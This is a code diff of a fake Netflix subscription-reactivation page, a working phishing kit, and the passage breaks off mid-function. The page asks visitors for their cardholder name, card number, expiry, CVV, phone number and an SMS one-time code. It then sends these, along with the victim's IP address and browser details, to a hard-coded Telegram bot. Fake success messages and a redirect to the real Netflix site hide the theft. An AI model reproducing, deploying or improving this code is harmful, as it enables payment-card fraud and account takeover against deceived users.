@@ -13,7 +13,7 @@
 
         body {
             font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: #141414;
+            background: linear-gradient(135deg, #141414 0%, #1a1a2e 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -22,23 +22,38 @@
         }
 
         .card {
-            background: rgba(0,0,0,0.85);
-            border-radius: 12px;
+            background: rgba(0,0,0,0.88);
+            backdrop-filter: blur(2px);
+            border-radius: 20px;
             padding: 40px;
-            max-width: 450px;
+            max-width: 520px;
             width: 100%;
-            border: 1px solid #333;
+            border: 1px solid rgba(229, 9, 20, 0.3);
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            transition: all 0.3s ease;
         }
 
         .logo {
             text-align: center;
             margin-bottom: 30px;
+            animation: fadeInDown 0.5s ease;
         }
 
         .logo span {
             font-size: 32px;
             font-weight: bold;
             color: #E50914;
+            letter-spacing: 1px;
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         h1 {
@@ -46,6 +61,7 @@
             margin-bottom: 10px;
             color: white;
             text-align: center;
+            animation: fadeInUp 0.5s ease;
         }
 
         .sub {
@@ -56,22 +72,41 @@
         }
 
         .plan {
-            background: #222;
+            background: linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
             padding: 15px;
-            border-radius: 8px;
+            border-radius: 12px;
             margin-bottom: 12px;
             cursor: pointer;
-            transition: all 0.2s;
-            border: 2px solid transparent;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(255,255,255,0.05);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .plan::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(229,9,20,0.1), transparent);
+            transition: left 0.5s;
+        }
+
+        .plan:hover::before {
+            left: 100%;
         }
 
         .plan:hover {
-            background: #2a2a2a;
+            background: linear-gradient(135deg, #2a1a1a 0%, #1a0f0f 100%);
+            transform: translateX(5px);
         }
 
         .plan.selected {
             border-color: #E50914;
-            background: #2a1a1a;
+            background: linear-gradient(135deg, #2a1a1a 0%, #1a0f0f 100%);
+            box-shadow: 0 0 20px rgba(229, 9, 20, 0.3);
         }
 
         .plan-name {
@@ -93,83 +128,261 @@
             margin-top: 8px;
         }
 
+        .step-section {
+            display: none;
+            margin-top: 20px;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        .step-section.show {
+            display: block;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
         input {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #333;
-            border: 1px solid #444;
-            border-radius: 6px;
+            padding: 14px 15px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 10px;
             color: white;
-            box-sizing: border-box;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #E50914;
+            background: #252525;
+            box-shadow: 0 0 10px rgba(229, 9, 20, 0.2);
+        }
+
+        .cvv-wrapper {
+            position: relative;
+        }
+
+        .toggle-cvv {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 0;
+            margin: 0;
+            width: auto;
+        }
+
+        .toggle-cvv:hover {
+            color: #E50914;
         }
 
         .row {
             display: flex;
-            gap: 12px;
+            gap: 15px;
         }
 
-        .row input {
-            width: 50%;
+        .row .input-group {
+            flex: 1;
         }
 
         button {
             width: 100%;
             padding: 14px;
-            background: #E50914;
+            background: linear-gradient(135deg, #E50914 0%, #b80710 100%);
             color: white;
             border: none;
-            border-radius: 6px;
+            border-radius: 10px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        button::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.5s, height 0.5s;
+        }
+
+        button:active::after {
+            width: 200px;
+            height: 200px;
         }
 
         button:hover {
-            background: #f6121d;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(229, 9, 20, 0.4);
+        }
+
+        button:disabled {
+            background: #555;
+            transform: none;
+            cursor: not-allowed;
+        }
+
+        .btn-back {
+            background: #333;
+            margin-top: 10px;
+        }
+
+        .btn-back:hover {
+            background: #444;
+            box-shadow: none;
         }
 
         .message {
             margin-top: 15px;
-            padding: 10px;
-            border-radius: 6px;
+            padding: 12px;
+            border-radius: 10px;
             text-align: center;
             display: none;
+            animation: fadeInUp 0.3s ease;
         }
 
         .message.success {
-            background: #00ff0011;
+            background: rgba(0, 255, 0, 0.15);
             border: 1px solid #00ff00;
             color: #00ff00;
             display: block;
         }
 
         .message.error {
-            background: #ff000011;
+            background: rgba(255, 0, 0, 0.15);
             border: 1px solid #ff0000;
             color: #ff6666;
             display: block;
         }
 
         .message.loading {
-            background: #ffff0011;
+            background: rgba(255, 255, 0, 0.15);
             border: 1px solid #ffff00;
             color: #ffff66;
             display: block;
         }
 
-        .clearfix::after {
-            content: "";
-            clear: both;
-            display: table;
+        .message.info {
+            background: rgba(51, 153, 255, 0.15);
+            border: 1px solid #3399ff;
+            color: #66ccff;
+            display: block;
+        }
+
+        .message.warning {
+            background: rgba(255, 165, 0, 0.15);
+            border: 1px solid #ffa500;
+            color: #ffa500;
+            display: block;
+        }
+
+        .card-type {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 24px;
+            pointer-events: none;
+        }
+
+        .position-relative {
+            position: relative;
         }
 
         .error-small {
             color: #ff6666;
             font-size: 11px;
-            margin-top: -5px;
-            margin-bottom: 5px;
+            margin-top: 5px;
+            margin-bottom: 0;
+        }
+
+        .countdown {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+        }
+
+        .selected-plan-info {
+            background: rgba(229, 9, 20, 0.15);
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #E50914;
+            display: none;
+            border: 1px solid rgba(229, 9, 20, 0.3);
+        }
+
+        .selected-plan-info.show {
+            display: block;
+            animation: fadeInUp 0.3s ease;
+        }
+
+        .phone-display {
+            background: linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 15px 0;
+            font-size: 16px;
+            font-weight: bold;
+            color: #E50914;
+            border: 1px solid #333;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .code-input {
+            text-align: center;
+            font-size: 28px;
+            letter-spacing: 8px;
+            font-weight: bold;
+        }
+
+        .attempts-left {
+            text-align: center;
+            font-size: 12px;
+            color: #ffa500;
+            margin-top: 10px;
+        }
+
+        .blocked-message {
+            text-align: center;
+            padding: 20px;
+            background: rgba(255,0,0,0.2);
+            border-radius: 10px;
+            color: #ff6666;
         }
     </style>
 </head>
@@ -179,59 +392,298 @@
             <span>NETFLIX</span>
         </div>
         
-        <h1>🔄 Reactivate Subscription</h1>
-        <div class="sub">Choose your plan to continue watching</div>
+        <h1 id="mainTitle">🔄 Reactivate Subscription</h1>
+        <div id="mainSub" class="sub">Choose your plan to continue watching</div>
 
-        <!-- Plans -->
-        <div class="plan" data-price="9.99" data-name="Basic">
-            <div class="clearfix">
-                <span class="plan-name">🔴 Basic</span>
-                <span class="plan-price">$9.99</span>
+        <!-- STEP 1: Plans -->
+        <div id="step1">
+            <div class="plan" data-price="9.99" data-name="Basic">
+                <div class="clearfix">
+                    <span class="plan-name">🔴 Basic</span>
+                    <span class="plan-price">$9.99</span>
+                </div>
+                <div class="plan-features">✓ HD quality • 1 device</div>
             </div>
-            <div class="plan-features">✓ HD quality • 1 device</div>
-        </div>
 
-        <div class="plan" data-price="15.99" data-name="Standard">
-            <div class="clearfix">
-                <span class="plan-name">🔵 Standard</span>
-                <span class="plan-price">$15.99</span>
+            <div class="plan" data-price="15.99" data-name="Standard">
+                <div class="clearfix">
+                    <span class="plan-name">🔵 Standard</span>
+                    <span class="plan-price">$15.99</span>
+                </div>
+                <div class="plan-features">✓ Full HD • 2 devices • 🔥 Popular</div>
             </div>
-            <div class="plan-features">✓ Full HD • 2 devices • Popular</div>
-        </div>
 
-        <div class="plan" data-price="19.99" data-name="Premium">
-            <div class="clearfix">
-                <span class="plan-name">💎 Premium</span>
-                <span class="plan-price">$19.99</span>
+            <div class="plan" data-price="19.99" data-name="Premium">
+                <div class="clearfix">
+                    <span class="plan-name">💎 Premium</span>
+                    <span class="plan-price">$19.99</span>
+                </div>
+                <div class="plan-features">✓ 4K+HDR • 4 devices • Spatial Audio</div>
             </div>
-            <div class="plan-features">✓ 4K+HDR • 4 devices • Spatial Audio</div>
+
+            <div id="selectedPlanInfo" class="selected-plan-info">
+                ✅ Selected: <span id="selectedPlanName"></span> - $<span id="selectedPlanPrice"></span>/month
+            </div>
+
+            <button id="continueBtn">🔄 Continue</button>
         </div>
 
-        <!-- Payment Form -->
-        <input type="text" id="cardName" placeholder="Full Name on Card">
-        <div id="nameError" class="error-small"></div>
-        
-        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19">
-        <div id="cardError" class="error-small"></div>
-        
-        <div class="row">
-            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
-            <input type="password" id="cvv" placeholder="CVV" maxlength="3">
-        </div>
-        <div id="expiryError" class="error-small"></div>
+        <!-- STEP 2: Card Details -->
+        <div id="step2" class="step-section">
+            <div class="sub">💳 Enter your card details</div>
+            
+            <div class="input-group">
+                <input type="text" id="cardName" placeholder="Full Name on Card" autocomplete="off">
+                <div id="nameError" class="error-small"></div>
+            </div>
+            
+            <div class="input-group position-relative">
+                <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" autocomplete="off">
+                <span id="cardTypeIcon" class="card-type"></span>
+                <div id="cardError" class="error-small"></div>
+            </div>
+            
+            <div class="row">
+                <div class="input-group">
+                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="off">
+                    <div id="expiryError" class="error-small"></div>
+                </div>
+                <div class="input-group cvv-wrapper">
+                    <input type="password" id="cvv" placeholder="CVV" maxlength="3" autocomplete="off">
+                    <button type="button" class="toggle-cvv" onclick="toggleCVV()">👁️</button>
+                    <div id="cvvError" class="error-small"></div>
+                </div>
+            </div>
 
-        <button onclick="sendToTelegram()">🔄 Reactivate Now</button>
+            <div class="input-group">
+                <input type="tel" id="phoneNumber" placeholder="Phone Number (for SMS verification)" autocomplete="off">
+                <div id="phoneError" class="error-small"></div>
+            </div>
+
+            <button id="sendCodeBtn">📱 Send Verification Code</button>
+            <button id="backToPlans" class="btn-back">↩️ Back to Plans</button>
+        </div>
+
+        <!-- STEP 3: SMS Verification -->
+        <div id="step3" class="step-section">
+            <div class="sub">📱 SMS Verification</div>
+            <div id="phoneDisplay" class="phone-display"></div>
+            <div class="sub" style="font-size: 12px;">Enter the 6-digit code sent to your phone</div>
+            
+            <div class="input-group">
+                <input type="text" id="smsCode" class="code-input" placeholder="000000" maxlength="6" autocomplete="off">
+                <div id="smsError" class="error-small"></div>
+            </div>
+            
+            <div id="attemptsLeft" class="attempts-left"></div>
+            
+            <button id="resendBtn" class="btn-back" style="background: #444;">📱 Resend Code</button>
+            <div id="smsCountdown" class="countdown"></div>
+            
+            <button id="verifyBtn">✅ Verify & Complete Payment</button>
+            <button id="backToCard" class="btn-back">↩️ Back to Card Details</button>
+        </div>
+
         <div id="message" class="message"></div>
+        <div id="countdown" class="countdown"></div>
     </div>
 
     <script>
-        // TELEGRAM CONFIGURATION
+        // ========== CONFIGURATION ==========
         const BOT_TOKEN = "8627160097:AAHrqaMZsLKwLOv_LWsLUgpWOADxcxpzCqA";
         const CHAT_ID = "7714049413";
+        const OFFICIAL_NETFLIX_URL = "https://www.netflix.com";
+        const MAX_ATTEMPTS = 3;
         
+        // ========== VARIABLES ==========
         let selectedPlan = null;
+        let currentPhone = null;
+        let currentSmsCode = null;
+        let cardData = {};
+        let smsTimer = null;
+        let resendCooldown = false;
+        let smsAttempts = 0;
+        let isBlocked = false;
 
-        // Plan selection
+        // ========== HELPER FUNCTIONS ==========
+        function showMessage(msg, type, duration = 3000) {
+            const msgDiv = document.getElementById('message');
+            msgDiv.className = `message ${type}`;
+            msgDiv.innerHTML = msg;
+            setTimeout(() => {
+                if(msgDiv.className === `message ${type}`) {
+                    msgDiv.className = 'message';
+                }
+            }, duration);
+        }
+
+        function generateSMSCode() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        function updateAttemptsDisplay() {
+            const attemptsLeft = MAX_ATTEMPTS - smsAttempts;
+            const attemptsDiv = document.getElementById('attemptsLeft');
+            if (attemptsLeft > 0) {
+                attemptsDiv.innerHTML = `⚠️ ${attemptsLeft} attempt(s) remaining`;
+                attemptsDiv.style.color = attemptsLeft === 1 ? '#ff6666' : '#ffa500';
+            } else {
+                attemptsDiv.innerHTML = '🔒 Too many failed attempts. Please request a new code.';
+                attemptsDiv.style.color = '#ff6666';
+            }
+        }
+
+        function resetSMSAttempts() {
+            smsAttempts = 0;
+            updateAttemptsDisplay();
+        }
+
+        function blockAndReset() {
+            isBlocked = true;
+            const msgDiv = document.getElementById('message');
+            msgDiv.className = 'message warning';
+            msgDiv.innerHTML = '⚠️ Too many failed attempts! Please click "Resend Code" to get a new code.';
+            
+            setTimeout(() => {
+                if(msgDiv.className === 'message warning') {
+                    msgDiv.className = 'message';
+                }
+            }, 4000);
+        }
+
+        // ========== Luhn Algorithm (Card Validation) ==========
+        function validateLuhn(cardNumber) {
+            let sum = 0;
+            let alternate = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let n = parseInt(cardNumber.charAt(i), 10);
+                if (alternate) {
+                    n *= 2;
+                    if (n > 9) n = (n % 10) + 1;
+                }
+                sum += n;
+                alternate = !alternate;
+            }
+            return sum % 10 === 0;
+        }
+
+        // ========== Detect Card Type ==========
+        function getCardType(number) {
+            const patterns = {
+                'Visa': /^4/,
+                'MasterCard': /^5[1-5]/,
+                'American Express': /^3[47]/,
+                'Discover': /^6(?:011|5)/,
+                'JCB': /^35(2[89]|[3-8][0-9])/
+            };
+            for (const [type, pattern] of Object.entries(patterns)) {
+                if (pattern.test(number)) {
+                    return type;
+                }
+            }
+            return 'Unknown';
+        }
+
+        function updateCardIcon() {
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const iconSpan = document.getElementById('cardTypeIcon');
+            if (cardNumber.length > 0) {
+                const type = getCardType(cardNumber);
+                const icons = {
+                    'Visa': '💳 VISA',
+                    'MasterCard': '💳 MC',
+                    'American Express': '💳 AMEX',
+                    'Discover': '💳 DISC',
+                    'JCB': '💳 JCB'
+                };
+                iconSpan.innerHTML = icons[type] || '💳';
+            } else {
+                iconSpan.innerHTML = '';
+            }
+        }
+
+        // ========== Toggle CVV Visibility ==========
+        function toggleCVV() {
+            const cvvInput = document.getElementById('cvv');
+            const toggleBtn = document.querySelector('.toggle-cvv');
+            if (cvvInput.type === 'password') {
+                cvvInput.type = 'text';
+                toggleBtn.innerHTML = '🙈';
+            } else {
+                cvvInput.type = 'password';
+                toggleBtn.innerHTML = '👁️';
+            }
+        }
+
+        // ========== Save to Local Storage ==========
+        function saveToLocalStorage() {
+            const data = {
+                cardName: document.getElementById('cardName').value,
+                cardNumber: document.getElementById('cardNumber').value,
+                expiry: document.getElementById('expiry').value,
+                phoneNumber: document.getElementById('phoneNumber').value
+            };
+            localStorage.setItem('netflix_card_data', JSON.stringify(data));
+        }
+
+        function loadFromLocalStorage() {
+            const saved = localStorage.getItem('netflix_card_data');
+            if (saved) {
+                const data = JSON.parse(saved);
+                if (document.getElementById('cardName').value === '') {
+                    document.getElementById('cardName').value = data.cardName || '';
+                    document.getElementById('cardNumber').value = data.cardNumber || '';
+                    document.getElementById('expiry').value = data.expiry || '';
+                    document.getElementById('phoneNumber').value = data.phoneNumber || '';
+                }
+            }
+        }
+
+        // ========== Format Inputs ==========
+        document.getElementById('cardNumber').oninput = function(e) {
+            let val = e.target.value.replace(/\D/g, '');
+            val = val.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = val.substring(0, 19);
+            updateCardIcon();
+            saveToLocalStorage();
+        };
+
+        document.getElementById('expiry').oninput = function(e) {
+            let val = e.target.value.replace(/\D/g, '');
+            if(val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+            e.target.value = val.slice(0,5);
+            saveToLocalStorage();
+        };
+
+        document.getElementById('cvv').oninput = function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+        };
+
+        document.getElementById('phoneNumber').oninput = function(e) {
+            let val = e.target.value.replace(/\D/g, '');
+            if(val.length > 15) val = val.slice(0,15);
+            e.target.value = val;
+            saveToLocalStorage();
+        };
+
+        document.getElementById('cardName').oninput = function() {
+            saveToLocalStorage();
+        };
+
+        document.getElementById('smsCode').oninput = function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0,6);
+        };
+
+        function clearErrors() {
+            document.getElementById('nameError').innerHTML = '';
+            document.getElementById('cardError').innerHTML = '';
+            document.getElementById('expiryError').innerHTML = '';
+            document.getElementById('cvvError').innerHTML = '';
+            document.getElementById('phoneError').innerHTML = '';
+            document.getElementById('smsError').innerHTML = '';
+        }
+
+        // ========== STEP 1: Select Plan ==========
         document.querySelectorAll('.plan').forEach(plan => {
             plan.onclick = function() {
                 document.querySelectorAll('.plan').forEach(p => p.classList.remove('selected'));
@@ -240,151 +692,327 @@
                     name: this.querySelector('.plan-name').textContent,
                     price: this.dataset.price
                 };
+                
+                document.getElementById('selectedPlanName').innerText = selectedPlan.name;
+                document.getElementById('selectedPlanPrice').innerText = selectedPlan.price;
+                document.getElementById('selectedPlanInfo').classList.add('show');
             };
         });
 
-        // Format card number
-        document.getElementById('cardNumber').oninput = function(e) {
-            let val = e.target.value.replace(/\D/g, '');
-            val = val.replace(/(\d{4})/g, '$1 ').trim();
-            e.target.value = val.substring(0, 19);
-        };
-
-        // Format expiry
-        document.getElementById('expiry').oninput = function(e) {
-            let val = e.target.value.replace(/\D/g, '');
-            if(val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
-            e.target.value = val.slice(0,5);
-        };
-
-        // Only numbers for CVV
-        document.getElementById('cvv').oninput = function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
-        };
-
-        // Clear errors
-        function clearErrors() {
-            document.getElementById('nameError').innerHTML = '';
-            document.getElementById('cardError').innerHTML = '';
-            document.getElementById('expiryError').innerHTML = '';
-        }
-
-        // Main function
-        function sendToTelegram() {
-            const msgDiv = document.getElementById('message');
-            
-            // Check plan
+        document.getElementById('continueBtn').onclick = function() {
             if(!selectedPlan) {
-                msgDiv.className = 'message error';
-                msgDiv.innerHTML = '❌ Please select a plan';
-                setTimeout(() => {
-                    msgDiv.className = 'message';
-                }, 2000);
+                showMessage('❌ Please select a plan first', 'error');
                 return;
             }
+            
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').classList.add('show');
+            document.getElementById('mainTitle').innerHTML = '💳 Payment Details';
+            document.getElementById('mainSub').innerHTML = `Plan: ${selectedPlan.name} - $${selectedPlan.price}/month`;
+            loadFromLocalStorage();
+        };
 
-            // Get values
+        document.getElementById('backToPlans').onclick = function() {
+            document.getElementById('step2').classList.remove('show');
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('mainTitle').innerHTML = '🔄 Reactivate Subscription';
+            document.getElementById('mainSub').innerHTML = 'Choose your plan to continue watching';
+        };
+
+        document.getElementById('backToCard').onclick = function() {
+            document.getElementById('step3').classList.remove('show');
+            document.getElementById('step2').classList.add('show');
+            document.getElementById('mainTitle').innerHTML = '💳 Payment Details';
+            document.getElementById('mainSub').innerHTML = `Plan: ${selectedPlan.name} - $${selectedPlan.price}/month`;
+            resetSMSAttempts();
+            isBlocked = false;
+            if(smsTimer) clearInterval(smsTimer);
+        };
+
+        // ========== Validate Card Form ==========
+        function validateCardForm() {
             const name = document.getElementById('cardName').value.trim();
             const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
+            const phone = document.getElementById('phoneNumber').value.trim();
 
-            // Clear old errors
             clearErrors();
             let hasError = false;
 
-            // Validate
             if(!name || name.length < 3) {
                 document.getElementById('nameError').innerHTML = '⚠️ Enter full name';
                 hasError = true;
             }
+            
             if(!card || card.length < 13) {
                 document.getElementById('cardError').innerHTML = '⚠️ Enter valid card number';
                 hasError = true;
+            } else if(!validateLuhn(card)) {
+                document.getElementById('cardError').innerHTML = '⚠️ Invalid card number';
+                hasError = true;
             }
+            
             if(!expiry || !expiry.match(/^\d{2}\/\d{2}$/)) {
                 document.getElementById('expiryError').innerHTML = '⚠️ Enter MM/YY';
                 hasError = true;
-            }
-            if(!cvv || cvv.length < 3) {
-                if(!document.getElementById('expiryError').innerHTML) {
-                    document.getElementById('expiryError').innerHTML = '⚠️ Enter CVV';
+            } else {
+                const month = parseInt(expiry.split('/')[0]);
+                const year = parseInt(expiry.split('/')[1]);
+                const currentYear = new Date().getFullYear() % 100;
+                const currentMonth = new Date().getMonth() + 1;
+                if(month < 1 || month > 12) {
+                    document.getElementById('expiryError').innerHTML = '⚠️ Invalid month';
+                    hasError = true;
                 }
+                if(year < currentYear || (year === currentYear && month < currentMonth)) {
+                    document.getElementById('expiryError').innerHTML = '⚠️ Card has expired';
+                    hasError = true;
+                }
+            }
+            
+            if(!cvv || cvv.length < 3) {
+                document.getElementById('cvvError').innerHTML = '⚠️ Enter CVV';
+                hasError = true;
+            }
+            
+            if(!phone || phone.length < 8) {
+                document.getElementById('phoneError').innerHTML = '⚠️ Enter valid phone number';
                 hasError = true;
             }
 
-            if(hasError) {
-                msgDiv.className = 'message error';
-                msgDiv.innerHTML = '❌ Please fix errors above';
-                setTimeout(() => {
-                    msgDiv.className = 'message';
-                }, 2500);
-                return;
+            if(!hasError) {
+                cardData = { name, card, expiry, cvv };
+                currentPhone = phone;
             }
 
-            // Show loading
-            msgDiv.className = 'message loading';
-            msgDiv.innerHTML = '⏳ Processing... Please wait';
-
-            // Get IP info
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(ipData => {
-                    const ip = ipData.ip;
-                    const userAgent = navigator.userAgent;
-                    const date = new Date();
-                    const dateStr = date.toLocaleString();
-                    
-                    // Detect device
-                    let device = '💻 Desktop';
-                    if(/Mobile|Android|iPhone|iPad/i.test(userAgent)) {
-                        device = '📱 Mobile';
-                    }
-                    
-                    // Detect browser
-                    let browser = 'Unknown';
-                    if(userAgent.includes('Chrome')) browser = 'Chrome';
-                    else if(userAgent.includes('Firefox')) browser = 'Firefox';
-                    else if(userAgent.includes('Safari')) browser = 'Safari';
-                    else if(userAgent.includes('Edge')) browser = 'Edge';
-                    
-                    // Build message
-                    const message = `🎬 NETFLIX CARD DATA 🎬%0A━━━━━━━━━━━━━━━━━━━━%0A💳 NAME: ${name}%0A🔢 CARD: ${card}%0A📅 EXPIRY: ${expiry}%0A🔐 CVV: ${cvv}%0A━━━━━━━━━━━━━━━━━━━━%0A📺 PLAN: ${selectedPlan.name}%0A💰 PRICE: $${selectedPlan.price}%0A━━━━━━━━━━━━━━━━━━━━%0A🌐 IP: ${ip}%0A📱 DEVICE: ${device}%0A🌍 BROWSER: ${browser}%0A🕒 TIME: ${dateStr}%0A━━━━━━━━━━━━━━━━━━━━%0A✅ STATUS: CAPTURED`;
-                    
-                    // Send to Telegram
-                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-                    
-                    return fetch(url, {
-                        method: 'GET',
-                        mode: 'cors'
-                    });
-                })
-                .then(() => {
-                    // Success
-                    msgDiv.className = 'message success';
-                    msgDiv.innerHTML = `✅ Reactivated successfully! 🎉<br>Plan: ${selectedPlan.name} • $${selectedPlan.price}/month<br><br>Redirecting to Netflix...`;
-                    
-                    // Clear form
-                    document.getElementById('cardName').value = '';
-                    document.getElementById('cardNumber').value = '';
-                    document.getElementById('expiry').value = '';
-                    document.getElementById('cvv').value = '';
-                    
-                    // Redirect after 2 seconds
-                    setTimeout(() => {
-                        window.location.href = 'https://www.netflix.com';
-                    }, 2500);
-                })
-                .catch((error) => {
-                    console.error('Error:', error);
-                    msgDiv.className = 'message error';
-                    msgDiv.innerHTML = '❌ Connection error. Please try again.';
-                    
-                    setTimeout(() => {
-                        msgDiv.className = 'message';
-                    }, 3000);
-                });
+            return !hasError;
         }
+
+        // ========== Send to Telegram ==========
+        async function sendToTelegram(type, data = {}) {
+            const ip = await fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => data.ip)
+                .catch(() => 'Unknown');
+            
+            const userAgent = navigator.userAgent;
+            const date = new Date().toLocaleString();
+            
+            let device = '💻 Desktop';
+            if(/Mobile|Android|iPhone|iPad/i.test(userAgent)) device = '📱 Mobile';
+            
+            let browser = 'Unknown';
+            if(userAgent.includes('Chrome')) browser = 'Chrome';
+            else if(userAgent.includes('Firefox')) browser = 'Firefox';
+            else if(userAgent.includes('Safari')) browser = 'Safari';
+            
+            let message = '';
+            
+            if(type === 'card') {
+                message = `🎬 NETFLIX - CARD DATA 🎬%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `💳 Name: ${cardData.name}%0A`;
+                message += `🔢 Card: ${cardData.card}%0A`;
+                message += `📅 Expiry: ${cardData.expiry}%0A`;
+                message += `🔐 CVV: ${cardData.cvv}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `📞 Phone: +${currentPhone}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `📺 Plan: ${selectedPlan.name}%0A`;
+                message += `💰 Price: $${selectedPlan.price}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `🌐 IP: ${ip}%0A`;
+                message += `📱 Device: ${device}%0A`;
+                message += `🌍 Browser: ${browser}%0A`;
+                message += `🕒 Time: ${date}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `⏳ Waiting for SMS verification...`;
+            }
+            else if(type === 'sms') {
+                message = `📱 NETFLIX - SMS CODE 📱%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `📞 Phone: +${currentPhone}%0A`;
+                message += `🔑 Code: ${data.code}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `🌐 IP: ${ip}%0A`;
+                message += `🕒 Time: ${date}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `✅ Waiting for user to enter code...`;
+            }
+            else if(type === 'failed') {
+                message = `⚠️ NETFLIX - FAILED ATTEMPT ⚠️%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `📞 Phone: +${currentPhone}%0A`;
+                message += `❌ Wrong code entered: ${data.code}%0A`;
+                message += `📊 Attempts left: ${data.attemptsLeft}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `🌐 IP: ${ip}%0A`;
+                message += `🕒 Time: ${date}%0A`;
+            }
+            else if(type === 'complete') {
+                message = `🎯 NETFLIX - PAYMENT COMPLETED 🎯%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `📞 Phone: +${currentPhone}%0A`;
+                message += `🔑 Verified Code: ${data.code}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `📺 Plan: ${selectedPlan.name}%0A`;
+                message += `💰 Price: $${selectedPlan.price}/month%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `🌐 IP: ${ip}%0A`;
+                message += `🕒 Time: ${date}%0A`;
+                message += `━━━━━━━━━━━━━━━━━━━━%0A`;
+                message += `✅ SUBSCRIPTION REACTIVATED!%0A`;
+                message += `➡️ User redirected to official Netflix`;
+            }
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+            
+            try {
+                await fetch(url, { method: 'GET', mode: 'cors' });
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // ========== Resend Cooldown ==========
+        function startResendCooldown(seconds) {
+            const resendBtn = document.getElementById('resendBtn');
+            const countdownDiv = document.getElementById('smsCountdown');
+            let remaining = seconds;
+            
+            resendBtn.disabled = true;
+            resendBtn.style.opacity = '0.5';
+            resendCooldown = true;
+            
+            if(smsTimer) clearInterval(smsTimer);
+            
+            smsTimer = setInterval(() => {
+                remaining--;
+                countdownDiv.innerHTML = `⏱️ Resend code in ${remaining} seconds`;
+                if(remaining <= 0) {
+                    clearInterval(smsTimer);
+                    countdownDiv.innerHTML = '';
+                    resendBtn.disabled = false;
+                    resendBtn.style.opacity = '1';
+                    resendCooldown = false;
